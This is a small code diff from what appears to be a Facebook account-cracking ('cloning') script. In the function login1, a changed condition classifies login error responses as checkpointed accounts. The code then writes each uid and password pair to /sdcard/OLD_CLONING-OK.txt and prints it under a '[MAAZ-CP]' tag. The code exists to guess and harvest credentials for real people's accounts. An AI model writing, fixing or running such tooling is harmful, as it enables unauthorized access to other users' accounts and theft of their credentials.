@@ -449,7 +449,7 @@ def login1(uid):
                 os.system('espeak -a 300 "OK ID Found"')
                 break
 
-            elif "error" in rp and "www.facebook.com" in rp.get("error", {}).get("message", ""):
+            elif "www.facebook.com" in rp['error']['message']:
                 cps.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
                 print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw}\033[1;97m')
